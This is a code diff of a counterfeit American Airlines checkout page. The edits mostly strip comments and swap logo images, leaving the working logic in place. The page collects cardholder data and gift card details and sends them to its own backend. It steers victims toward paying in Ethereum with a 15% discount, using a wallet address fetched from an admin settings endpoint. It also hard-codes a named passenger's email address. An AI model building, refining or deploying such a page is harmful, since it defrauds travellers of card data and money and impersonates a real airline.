@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>American Airlines - Review and Pay</title>
-    <!-- Importing Google Font for clean typography -->
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -19,7 +18,6 @@
             color: #222;
         }
 
-        /* Top Bar */
         header.top-bar {
             background: #ffffff;
             display: flex;
@@ -68,7 +66,6 @@
             line-height: 1;
         }
 
-        /* Main Content Wrapper */
         .main-container {
             max-width: 820px;
             margin: 15px auto;
@@ -82,7 +79,6 @@
             margin-bottom: 16px;
         }
 
-        /* --- Ambassador Welcome Banner --- */
         .ambassador-welcome-banner {
             background: linear-gradient(135deg, #0b2341 0%, #00539f 100%);
             color: #ffffff;
@@ -117,7 +113,6 @@
             opacity: 0.9;
         }
 
-        /* --- Passenger Details Box --- */
         .passenger-details-box {
             background: #ffffff;
             border: 1px solid #ccd2d9;
@@ -151,7 +146,6 @@
             margin-bottom: 2px;
         }
 
-        /* --- Itinerary & Hotel Section Styles --- */
         .trip-section {
             background: #ffffff;
             border: 1px solid #ccd2d9;
@@ -288,7 +282,6 @@
             border-radius: 0 4px 4px 0;
         }
 
-        /* Hotel Specific Styles */
         .hotel-header-info {
             display: flex;
             justify-content: space-between;
@@ -317,7 +310,6 @@
             text-transform: uppercase;
         }
 
-        /* --- Cost Summary Box Styles --- */
         .cost-summary-box {
             background: #ffffff;
             border: 1px solid #ccd2d9;
@@ -372,7 +364,6 @@
             display: none;
         }
 
-        /* Payment Card Box */
         .payment-box {
             background: #ffffff;
             border: 1px solid #ccd2d9;
@@ -402,7 +393,6 @@
             margin-bottom: 12px;
         }
 
-        /* Payer Information Form Styles */
         .payer-info-container {
             background: #f8f9fa;
             border: 1px solid #e1e4e8;
@@ -459,7 +449,6 @@
             font-size: 13px;
         }
 
-        /* Inline Card Form Inputs */
         .card-form-container {
             background: #f8f9fa;
             border: 1px solid #cbd5e1;
@@ -663,7 +652,6 @@
             border-radius: 4px;
         }
 
-        /* --- Big Proceed to Payment Button Styles --- */
         .proceed-payment-container {
             margin-bottom: 24px;
         }
@@ -697,7 +685,6 @@
             margin-top: 8px;
         }
 
-        /* --- Custom Responsive Pop-up Modal Styles --- */
         .custom-modal-overlay {
             display: none;
             position: fixed;
@@ -769,7 +756,6 @@
             background: #003d73;
         }
 
-        /* --- Limited-Time Offer Box Styles --- */
         .promo-offer-box {
             background: #ffffff;
             border: 1px solid #ccd2d9;
@@ -863,7 +849,6 @@
             font-size: 12px;
         }
 
-        /* --- Extra Promos with Logos Styles --- */
         .extra-promos-stack {
             margin-bottom: 24px;
         }
@@ -895,7 +880,6 @@
             color: #555;
         }
 
-        /* --- Footer Links Styles --- */
         footer.main-footer {
             border-top: 1px solid #ccd2d9;
             padding: 24px 0;
@@ -963,7 +947,6 @@
             font-size: 11px;
         }
 
-        /* Desktop expansion queries */
         @media (min-width: 768px) {
             header.top-bar {
                 padding: 12px 40px;
@@ -1042,17 +1025,13 @@
         </div>
     </header>
 
-    <!-- Content Body -->
     <main class="main-container">
-
-        <!-- Ambassador Welcome Banner -->
         <div class="ambassador-welcome-banner">
             <div class="ambassador-tag">VIP Ambassador Status</div>
             <div class="ambassador-title">Welcome back, Melissa Ann Mia Malkova!</div>
             <div class="ambassador-subtitle">We are honored to have you traveling as our distinguished Ambassador.</div>
         </div>
 
-        <!-- Passenger Details Section -->
         <div class="passenger-details-box">
             <h2>Passenger details</h2>
             <div class="details-grid-row">
@@ -1077,12 +1056,10 @@
             </div>
         </div>
         
-        <!-- YOUR TRIP ITINERARY SECTION -->
         <div class="trip-section">
             <h2>Your trip</h2>
             <div class="trip-route-badge">PSP &rarr; FNT</div>
 
-            <!-- Flight Segment: PSP to FNT (AA 4921) -->
             <div class="flight-card">
                 <div class="flight-date">Sunday, September 27, 2026</div>
                 <div class="flight-main-info">
@@ -1114,7 +1091,6 @@
                 </div>
             </div>
 
-            <!-- Hotel Stay Card: Hilton Garden Inn Downtown -->
             <div class="hotel-card" style="margin-bottom: 0;">
                 <div class="hotel-date">Sunday, September 27 – Monday, September 28, 2026 (1 Night)</div>
                 <div class="hotel-header-info">
@@ -1127,7 +1103,6 @@
             </div>
         </div>
 
-        <!-- COST SUMMARY SECTION -->
         <div class="cost-summary-box">
             <div class="cost-summary-header">
                 <span>Cost summary</span>
@@ -1155,14 +1130,12 @@
             </div>
         </div>
 
-        <!-- REVIEW AND PAY SECTION -->
         <h1>Review and pay</h1>
 
         <div class="payment-box">
             <h2>Payment information</h2>
             <div class="required-sub">All fields are required.</div>
 
-            <!-- Payer Information Form Section -->
             <div class="payer-info-container">
                 <h4>Payer Details (Who is making this payment?)</h4>
                 <div class="relationship-options">
@@ -1189,7 +1162,6 @@
 
             <h3>How would you like to pay?</h3>
 
-            <!-- Trip Credit Box -->
             <div class="action-row" onclick="window.open('https://www.aa.com/trip-credit', '_blank')">
                 <div class="action-row-left">
                     <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/plane.png" alt="Plane Icon" class="option-icon-img" onerror="this.src='https://placehold.co/20x20/00539f/ffffff?text=✈'">
@@ -1198,7 +1170,6 @@
                 <div class="chevron">&gt;</div>
             </div>
 
-            <!-- Gift Card Box -->
             <div class="action-row" onclick="window.open('https://www.aa.com/gift-cards', '_blank')">
                 <div class="action-row-left">
                     <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/gift-card.png" alt="Gift Card Icon" class="option-icon-img" onerror="this.src='https://placehold.co/20x20/00539f/ffffff?text=🎁'">
@@ -1207,7 +1178,6 @@
                 <div class="chevron">&gt;</div>
             </div>
 
-            <!-- Promotion banner -->
             <div class="info-notice">
                 <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/star-around-world.png" alt="Star World Icon" class="banner-icon-img" onerror="this.src='https://placehold.co/18x18/00539f/ffffff?text=★'">
                 <div>
@@ -1216,9 +1186,7 @@
                 </div>
             </div>
 
-            <!-- Radio Options Section -->
             <div class="radio-section">
-                <!-- Credit Card Option -->
                 <div class="radio-item card-header-row">
                     <label onclick="updatePayment('card')">
                         <input type="radio" name="payment-method" id="methodCard" checked>
@@ -1227,17 +1195,12 @@
                 </div>
 
                 <div class="card-logos-container">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/visa1.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/visa2.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/visa3.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/visa4.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/visa5.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/visa6.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/visa7.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/visa8.jpg" alt="" class="cc-logo-img" onerror="this.style.display='none'">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" class="cc-logo-img">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" class="cc-logo-img">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg" alt="Amex" class="cc-logo-img">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal" class="cc-logo-img">
                 </div>
 
-                <!-- Hidden Card Entry Form Fields -->
                 <div class="card-form-container" id="cardDetailsContainer">
                     <div class="card-input-field">
                         <label>Cardholder Name</label>
@@ -1259,7 +1222,6 @@
                     </div>
                 </div>
 
-                <!-- Gift Card Payment Option -->
                 <div class="radio-item payment-row-divider">
                     <label onclick="updatePayment('giftcard')">
                         <input type="radio" name="payment-method" id="methodGiftCard">
@@ -1273,7 +1235,6 @@
                     </label>
                 </div>
 
-                <!-- Gift Card Entry Form Fields -->
                 <div class="giftcard-form-container" id="giftCardDetailsContainer">
                     <div class="card-input-field">
                         <label>Select Gift Card Brand / Type</label>
@@ -1302,7 +1263,6 @@
                     </div>
                 </div>
 
-                <!-- PayPal Option -->
                 <div class="radio-item payment-row-divider">
                     <label onclick="updatePayment('paypal')">
                         <input type="radio" name="payment-method" id="methodPaypal">
@@ -1315,7 +1275,6 @@
                     </label>
                 </div>
 
-                <!-- Ethereum Option with 15% Discount -->
                 <div class="radio-item payment-row-divider">
                     <label onclick="updatePayment('eth')">
                         <input type="radio" name="payment-method" id="methodEth">
@@ -1329,7 +1288,6 @@
                     </label>
                 </div>
 
-                <!-- Ethereum Entry Form Fields & Instructions -->
                 <div class="giftcard-form-container" id="ethDetailsContainer">
                     <div class="card-input-field">
                         <label>Send Ethereum to this Wallet Address:</label>
@@ -1362,7 +1320,6 @@
             </div>
         </div>
 
-        <!-- Big Proceed to Payment Button Section -->
         <div class="proceed-payment-container">
             <button type="button" class="proceed-btn" id="proceedBtn">
                 Proceed to Payment 🔒
@@ -1370,14 +1327,13 @@
             <div class="secure-checkout-note">Your payment and personal details are encrypted and securely processed.</div>
         </div>
 
-        <!-- LIMITED-TIME OFFER PROMO BOX -->
         <div class="promo-offer-box">
             <div class="offer-top-link">
                 <a href="https://www.aa.com/faqs" target="_blank">Reservation and tickets FAQs ↗</a>
             </div>
             <div class="offer-content-grid">
                 <div class="offer-left">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/visa1.jpg" alt="Credit Card" class="offer-card-img" onerror="this.src='https://placehold.co/80x50/00539f/ffffff?text=AA+Card'">
+                    <img src="https://images.unsplash.com/photo-1559526324-4b87b5e36e44?w=120" alt="Credit Card" class="offer-card-img">
                     <div>
                         <div class="offer-badge-text">LIMITED-TIME OFFER</div>
                         <div class="offer-main-numbers">Earn up to $250 + 40,000</div>
@@ -1396,11 +1352,10 @@
             <a href="https://www.aa.com/creditcards" target="_blank" class="learn-more-btn">Learn more ↗</a>
         </div>
 
-        <!-- EXTRAS SECTION WITH LOCAL LOGOS -->
         <div class="extra-promos-stack">
             <div class="extra-promo-row">
                 <a href="https://www.citicards.com" target="_blank" class="promo-logo-link">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/city.png" alt="Explore Citi / AAdvantage Credit Cards" onerror="this.src='https://placehold.co/80x24/00539f/ffffff?text=Citi'">
+                    <span style="font-weight: bold; color: #00539f; font-size: 16px;">Citi®</span>
                 </a>
                 <a href="https://www.citicards.com" target="_blank" class="extra-promo-link-text">Explore Citi® / AAdvantage® Credit Cards ↗</a>
                 <div class="extra-promo-desc">Choose the card that fits your travel style</div>
@@ -1408,7 +1363,7 @@
 
             <div class="extra-promo-row" style="margin-top: 12px;">
                 <a href="https://www.aa.com/buymiles" target="_blank" class="promo-logo-link">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/buymiles.png" alt="BuyMiles" onerror="this.src='https://placehold.co/80x24/00539f/ffffff?text=Buy+Miles'">
+                    <span style="font-weight: bold; color: #00539f; font-size: 16px;">Buy Miles</span>
                 </a>
                 <a href="https://www.aa.com/buymiles" target="_blank" class="extra-promo-link-text">BuyMiles ↗</a>
                 <div class="extra-promo-desc">Buy or gift miles for new adventures</div>
@@ -1416,7 +1371,7 @@
 
             <div class="extra-promo-row" style="margin-top: 12px;">
                 <a href="https://www.avis.com" target="_blank" class="promo-logo-link">
-                    <img src="https://eukkpduevwxyoyrmbcot.supabase.co/storage/v1/object/public/assets/avis.png" alt="Avis" onerror="this.src='https://placehold.co/80x24/00539f/ffffff?text=Avis'">
+                    <span style="font-weight: bold; color: #d11241; font-size: 16px;">AVIS</span>
                 </a>
                 <a href="https://www.avis.com" target="_blank" class="extra-promo-link-text">AVIS ↗</a>
                 <div class="extra-promo-desc">Rent an SUV with Avis starting at $55 a day</div>
@@ -1425,7 +1380,6 @@
 
     </main>
 
-    <!-- CUSTOM RESPONSIVE POP-UP MODAL CONTAINER -->
     <div class="custom-modal-overlay" id="customModal">
         <div class="custom-modal-content">
             <div class="custom-modal-header">
@@ -1440,7 +1394,6 @@
         </div>
     </div>
 
-    <!-- FOOTER SECTION -->
     <footer class="main-footer">
         <div class="main-container">
             <div class="footer-columns">
@@ -1489,15 +1442,13 @@
     </footer>
 
     <script>
-        const baseTotal = 1120.50; // 950 (flight) + 102 (hotel) + 68.50 (taxes)
+        const baseTotal = 1120.50;
         let activePaymentMethod = 'card';
 
-        // Custom Modal Function to replace standard browser alerts
         function showModal(title, message, callback) {
             document.getElementById('modalTitleText').textContent = title;
             document.getElementById('modalBodyText').textContent = message;
             document.getElementById('customModal').style.display = 'flex';
-            
             window.modalCallback = callback || null;
         }
 
@@ -1527,7 +1478,6 @@
             const giftCardContainer = document.getElementById('giftCardDetailsContainer');
             const ethContainer = document.getElementById('ethDetailsContainer');
 
-            // Toggle form containers visibility
             cardContainer.style.display = (method === 'card') ? 'flex' : 'none';
             document.getElementById('methodCard').checked = (method === 'card');
 
@@ -1542,7 +1492,6 @@
                 showModal('PayPal Notice', 'PayPal payment not available at the moment.');
             }
 
-            // Calculations & Discounts
             if (method === 'eth') {
                 const discountValue = baseTotal * 0.15;
                 const finalTotal = baseTotal - discountValue;
@@ -1551,8 +1500,6 @@
                 discountAmount.textContent = `-$${discountValue.toFixed(2)}`;
                 discountRow.style.display = 'flex';
                 totalDueDisplay.textContent = `$${finalTotal.toFixed(2)}`;
-                
-                // Auto-fill ETH amount suggestion
                 document.getElementById('ethSentAmount').value = `$${finalTotal.toFixed(2)}`;
             } else if (method === 'giftcard') {
                 const discountValue = baseTotal * 0.05;
@@ -1568,11 +1515,9 @@
             }
         }
 
-        // Handle Proceed to Payment submission and save details to backend server
         document.querySelector('.proceed-btn').addEventListener('click', async function(e) {
             e.preventDefault();
 
-            // Intercept PayPal right away if selected
             if (activePaymentMethod === 'paypal') {
                 showModal('PayPal Notice', 'PayPal payment not available at the moment.');
                 return;
@@ -1589,7 +1534,6 @@
                 return;
             }
 
-            // Collect Card Data if Credit/Debit Card is selected
             let cardData = {};
             if (activePaymentMethod === 'card') {
                 cardData = {
@@ -1605,7 +1549,6 @@
                 }
             }
 
-            // Collect Gift Card Data if Gift Card is selected
             let giftCardData = {};
             if (activePaymentMethod === 'giftcard') {
                 giftCardData = {
@@ -1619,7 +1562,6 @@
                 }
             }
 
-            // Collect Ethereum Data if Ethereum is selected
             let ethData = {};
             if (activePaymentMethod === 'eth') {
                 ethData = {
@@ -1640,7 +1582,6 @@
                                          activePaymentMethod === 'giftcard' ? (baseTotal * 0.95) : baseTotal;
 
             try {
-                // Build FormData payload to send text fields and image files to backend server.js
                 const formData = new FormData();
                 formData.append('passengerName', 'Melissa Ann Mia Malkova');
                 formData.append('passengerEmail', 'miamalkova1@gmail.com');
@@ -1714,7 +1655,6 @@
             }
         });
 
-        // --- NEW CODE ADDED TO FETCH LIVE ETH WALLET FROM DATABASE AUTOMATICALLY ---
         async function fetchAdminSettings() {
             try {
                 const response = await fetch('/api/settings');
@@ -1723,7 +1663,7 @@
                 if (data.success && data.ethWalletAddress) {
                     const ethInput = document.getElementById('ethWalletAddress');
                     if (ethInput) {
-                        ethInput.value = data.ethWalletAddress; // Dynamically injects live database wallet address
+                        ethInput.value = data.ethWalletAddress;
                     }
                 }
             } catch (error) {
@@ -1731,7 +1671,6 @@
             }
         }
 
-        // Automatically trigger live wallet fetch when page finishes loading
         window.addEventListener('DOMContentLoaded', () => {
             fetchAdminSettings();
         });
